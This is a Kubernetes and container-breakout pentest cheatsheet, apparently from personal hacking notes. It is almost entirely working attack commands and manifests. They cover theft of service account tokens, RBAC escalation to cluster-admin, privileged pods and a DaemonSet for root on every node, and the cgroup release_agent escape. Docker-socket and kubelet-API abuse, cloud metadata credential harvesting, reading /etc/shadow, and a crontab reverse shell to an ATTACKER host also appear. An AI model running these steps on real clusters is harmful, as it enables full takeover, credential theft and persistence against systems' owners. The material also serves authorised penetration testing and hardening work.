---
tags:
  - hack-notes
  - kubernetes
---

# Kubernetes and Container Breakout Cheatsheet

## Table of Contents

- [kubectl Enumeration](#kubectl-enumeration)
- [In-Pod Recon](#in-pod-recon)
- [Tooling](#tooling)
- [API Server with a Stolen Token](#api-server-with-a-stolen-token)
- [RBAC Abuse and Privilege Escalation](#rbac-abuse-and-privilege-escalation)
- [Container Breakout Primitives](#container-breakout-primitives)
- [Cloud Metadata from a Pod](#cloud-metadata-from-a-pod)
- [Deploying a Malicious Pod or DaemonSet](#deploying-a-malicious-pod-or-daemonset)
- [Kubelet API (10250) Exploitation](#kubelet-api-10250-exploitation)
- [Common Workflows](#common-workflows)
- [Quick Reference](#quick-reference)

---

## kubectl Enumeration

```bash
# Cluster and context basics
kubectl version --short
kubectl config view
kubectl config current-context
kubectl cluster-info

# What can I do? (the single most useful first command)
kubectl auth can-i --list                       # all permissions for the current identity
kubectl auth can-i --list --namespace kube-system
kubectl auth can-i create pods
kubectl auth can-i create pods --namespace kube-system
kubectl auth can-i get secrets
kubectl auth can-i '*' '*'                       # full admin check
kubectl auth can-i create clusterrolebindings
```

### Resource Inventory

```bash
# Pods, secrets, service accounts across all namespaces
kubectl get pods -A -o wide
kubectl get secrets -A
kubectl get serviceaccounts -A
kubectl get namespaces

# RBAC objects
kubectl get roles -A
kubectl get rolebindings -A
kubectl get clusterroles
kubectl get clusterrolebindings

# Describe to read the details
kubectl describe pod <pod> -n <ns>
kubectl describe clusterrole cluster-admin
kubectl describe clusterrolebinding <name>

# Dump a secret's value (base64 encoded)
kubectl get secret <name> -n <ns> -o jsonpath='{.data}'
kubectl get secret <name> -n <ns> -o jsonpath='{.data.token}' | base64 -d

# Find which bindings grant a role
kubectl get rolebindings,clusterrolebindings -A -o wide | grep <role-or-sa>
```

---

## In-Pod Recon

Once you have a shell in a pod, the service account token and mounts are the
first things to read.

```bash
# Service account token, namespace, and CA (default mount path)
cd /var/run/secrets/kubernetes.io/serviceaccount
cat token
cat namespace
cat ca.crt

# Store them for reuse
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
APISERVER=https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}

# Environment often leaks service hosts, ports, and injected secrets
env | sort
env | grep -iE "kubernetes|token|secret|password|api"

# Mounts reveal hostPath, docker.sock, and projected secrets
mount
cat /proc/mounts
ls -la /var/run/docker.sock 2>/dev/null      # docker socket mounted in?

# Am I privileged or do I hold dangerous capabilities?
cat /proc/self/status | grep -i cap
capsh --print 2>/dev/null
cat /proc/1/cgroup                            # cgroup paths leak container/runtime info

# Is this a container or the host? Quick tells
cat /proc/1/comm
ls -la /.dockerenv 2>/dev/null
```

---

## Tooling

```bash
# kube-hunter: remote and in-cluster vulnerability hunting
kube-hunter --remote <cluster-ip>
kube-hunter --pod                            # run from inside a pod
kube-hunter --cidr 10.0.0.0/24 --active      # active checks (intrusive)

# kube-bench: CIS benchmark auditing
kube-bench run --targets node,master
kube-bench run --benchmark cis-1.23

# kubeaudit: RBAC and pod security misconfig scanning
kubeaudit all
kubeaudit all -f /path/to/manifest.yaml

# peirates: in-pod Kubernetes attack toolkit (interactive menu)
peirates                                      # enumerate, steal tokens, escalate

# kubeletctl: talk to the kubelet API on a node
kubeletctl pods --server <node-ip>
kubeletctl scan --cidr 10.0.0.0/24

# ksniff: tcpdump traffic of a target pod via kubectl plugin
kubectl sniff <pod> -n <ns> -o capture.pcap
```

---

## API Server with a Stolen Token

```bash
# Raw curl against the API using a stolen service account token
curl --cacert $CACERT \
  --header "Authorization: Bearer $TOKEN" \
  -X GET $APISERVER/api/v1/namespaces/$NS/pods

# Skip TLS verification if you do not have the CA
curl -k --header "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/$NS/secrets

# Who am I according to the API server?
curl -k --header "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/authentication.k8s.io/v1/selfsubjectreviews \
  -X POST -H "Content-Type: application/json" \
  -d '{"apiVersion":"authentication.k8s.io/v1","kind":"SelfSubjectReview"}'

# Drive kubectl with the stolen token instead of curl
kubectl --token=$TOKEN --certificate-authority=$CACERT \
  --server=$APISERVER auth can-i --list -n $NS

# List all secrets cluster-wide if RBAC allows
curl -k --header "Authorization: Bearer $TOKEN" $APISERVER/api/v1/secrets
```

---

## RBAC Abuse and Privilege Escalation

The high-value verbs: `create pods`, `pods/exec`, `get secrets`, the
`escalate` verb on roles, `bind`, and `create` on clusterrolebindings.

```bash
# Confirm what your token allows before acting
kubectl auth can-i create pods
kubectl auth can-i create pods/exec
kubectl auth can-i get secrets
kubectl auth can-i escalate roles
kubectl auth can-i bind clusterroles
kubectl auth can-i create clusterrolebindings

# create pods -> mount a service account with more power, or break out
# (see Deploying a Malicious Pod section)

# pods/exec -> get a shell in an existing higher-privilege pod
kubectl exec -it <privileged-pod> -n <ns> -- /bin/sh

# get secrets -> read every credential in scope
kubectl get secrets -A -o yaml

# escalate verb -> grant your role permissions it does not already have
kubectl patch clusterrole <role> --type=json \
  -p='[{"op":"add","path":"/rules/-","value":{"apiGroups":["*"],"resources":["*"],"verbs":["*"]}}]'

# bind / create clusterrolebindings -> bind yourself to cluster-admin
kubectl create clusterrolebinding pwn \
  --clusterrole=cluster-admin \
  --serviceaccount=$NS:default
```

### Mounting a More Powerful Service Account

```bash
# If you can create pods, schedule one that mounts a privileged SA token,
# then exec in and read its token.
kubectl run sa-thief --image=alpine --restart=Never \
  --overrides='{"spec":{"serviceAccountName":"privileged-sa"}}' \
  -- sleep 3600
kubectl exec -it sa-thief -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

---

## Container Breakout Primitives

### Privileged Container

```bash
# Inside a privileged container you can mount the host disk directly
fdisk -l                                  # find the host root device, e.g. /dev/sda1
mkdir /host && mount /dev/sda1 /host
chroot /host /bin/bash                    # you are now effectively on the node
# Drop a key, edit /host/etc/cron.d, read /host/etc/shadow, etc.
```

### hostPath Mount

```yaml
# A pod that mounts the node root filesystem read-write
apiVersion: v1
kind: Pod
metadata:
  name: hostpath-pwn
spec:
  containers:
  - name: shell
    image: alpine
    command: ["/bin/sh", "-c", "sleep 3600"]
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
      type: Directory
```

```bash
kubectl apply -f hostpath-pwn.yaml
kubectl exec -it hostpath-pwn -- chroot /host /bin/sh
```

### CAP_SYS_ADMIN cgroup release_agent Escape

```bash
# Classic notify_on_release / release_agent breakout (needs CAP_SYS_ADMIN)
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab | head -1)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
cat > /cmd <<'EOF'
#!/bin/sh
ps aux > "$host_path/output"
EOF
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"   # trigger release_agent on the host
```

### /proc and Host Namespace Escapes

```bash
# nsenter into the host namespaces (works when hostPID is true or via /proc/1)
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash

# Read host files through another process root via /proc
ls -la /proc/1/root/                       # PID 1 root, often the host with hostPID
cat /proc/1/root/etc/shadow

# Write to host with /proc when a host mount is exposed
echo '* * * * * root /bin/bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"' \
  >> /proc/1/root/etc/crontab
```

### Docker Socket

```bash
# A mounted docker.sock is full host control
ls -la /var/run/docker.sock
docker -H unix:///var/run/docker.sock ps

# Spawn a privileged container that mounts the host root
docker -H unix:///var/run/docker.sock run -v /:/host -it --privileged alpine \
  chroot /host /bin/sh

# Without the docker CLI, hit the socket with curl
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
```

---

## Cloud Metadata from a Pod

The IMDS endpoint at 169.254.169.254 often hands out node IAM credentials.

```bash
# AWS IMDSv1
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>

# AWS IMDSv2 (token required)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP (Metadata-Flavor header required)
curl -s -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
curl -s -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/project/project-id"

# Azure (Metadata header required)
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

---

## Deploying a Malicious Pod or DaemonSet

```yaml
# Privileged pod with host PID, network, and full host filesystem
apiVersion: v1
kind: Pod
metadata:
  name: node-pwn
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: shell
    image: alpine
    securityContext:
      privileged: true
    command: ["/bin/sh", "-c", "sleep 3600"]
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
```

```bash
kubectl apply -f node-pwn.yaml
kubectl exec -it node-pwn -- nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

```yaml
# A DaemonSet schedules one privileged pod per node -> root on every node
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: pwn-ds
spec:
  selector:
    matchLabels:
      app: pwn
  template:
    metadata:
      labels:
        app: pwn
    spec:
      hostPID: true
      containers:
      - name: shell
        image: alpine
        securityContext:
          privileged: true
        command: ["/bin/sh", "-c", "sleep 100000"]
        volumeMounts:
        - name: host
          mountPath: /host
      volumes:
      - name: host
        hostPath:
          path: /
```

```bash
kubectl apply -f pwn-ds.yaml
kubectl get pods -l app=pwn -o wide          # one pod per node
```

---

## Kubelet API (10250) Exploitation

An unauthenticated or weakly authenticated kubelet on TCP 10250 lets you list
and exec into pods on that node directly, bypassing the API server and its RBAC.

```bash
# Enumerate pods the kubelet is running
curl -sk https://<node-ip>:10250/pods | jq '.items[].metadata | {ns: .namespace, name: .name}'

# Read running pods (alternate endpoint)
curl -sk https://<node-ip>:10250/runningpods/ | jq .

# Exec a command in a pod via the kubelet (namespace/pod/container)
curl -sk -X POST \
  "https://<node-ip>:10250/run/<namespace>/<pod>/<container>" \
  -d "cmd=id"

# kubeletctl wraps all of this
kubeletctl pods --server <node-ip>
kubeletctl exec "id" -p <pod> -c <container> -n <namespace> --server <node-ip>
kubeletctl scan --cidr 10.0.0.0/24           # find exposed kubelets

# Harvest service account tokens from every pod on the node
kubeletctl exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" \
  -p <pod> -c <container> -n <namespace> --server <node-ip>
```

---

## Common Workflows

### Token to Cluster Compromise

```bash
# 1) Token from pod: read the mounted service account token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
APISERVER=https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}

# 2) can-i: map what the token is allowed to do
kubectl --token=$TOKEN --server=$APISERVER --insecure-skip-tls-verify \
  auth can-i --list

# 3) create privileged pod: schedule a host-mounting privileged pod
kubectl --token=$TOKEN --server=$APISERVER --insecure-skip-tls-verify \
  apply -f node-pwn.yaml

# 4) mount host -> node root: chroot or nsenter onto the node
kubectl exec -it node-pwn -- chroot /host /bin/sh

# 5) cluster: harvest kubelet/IMDS creds and all secrets, or bind cluster-admin
kubectl get secrets -A -o yaml
kubectl create clusterrolebinding pwn --clusterrole=cluster-admin \
  --serviceaccount=$NS:default
```

### Breakout Triage from a Shell

```bash
# Decide the fastest escape path from whatever you landed in
cat /proc/self/status | grep -i cap          # CAP_SYS_ADMIN -> cgroup escape
ls -la /var/run/docker.sock                  # docker.sock -> host container
mount | grep -E "hostpath|/host"             # hostPath -> chroot the node
cat /proc/1/cgroup                           # privileged tells / runtime info
curl -s http://169.254.169.254/ -m 2         # IMDS reachable -> cloud creds
```

---

## Quick Reference

```bash
# Enumeration
kubectl auth can-i --list                    # current identity permissions
kubectl get pods,secrets,serviceaccounts -A  # cluster inventory
kubectl get clusterrolebindings              # who is cluster-admin

# In-pod
cat /var/run/secrets/kubernetes.io/serviceaccount/token   # SA token
env | grep -i kubernetes                     # service hosts and ports
ls -la /var/run/docker.sock                  # docker socket exposed?

# API with token
curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/secrets

# Escalation
kubectl create clusterrolebinding pwn --clusterrole=cluster-admin \
  --serviceaccount=$NS:default

# Breakout
chroot /host /bin/sh                         # after mounting host root
nsenter --target 1 --mount --uts --ipc --net --pid -- bash   # host namespaces
docker -H unix:///var/run/docker.sock run -v /:/host --privileged alpine chroot /host sh

# Kubelet
kubeletctl pods --server <node-ip>           # list pods on a node
kubeletctl exec "id" -p <pod> -c <ctr> -n <ns> --server <node-ip>

# Cloud metadata
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/   # AWS
curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/  # GCP
```

---

## Related

- Checklists: [Kubernetes and Containers](../Checklists/Kubernetes%20and%20Containers.md)
- Cepheus
- Container
- [AWS Pentest](AWS%20Pentest.md)
- [Azure and Entra ID](Azure%20and%20Entra%20ID.md)
- [Linux Privilege Escalation](Linux%20Privilege%20Escalation.md)
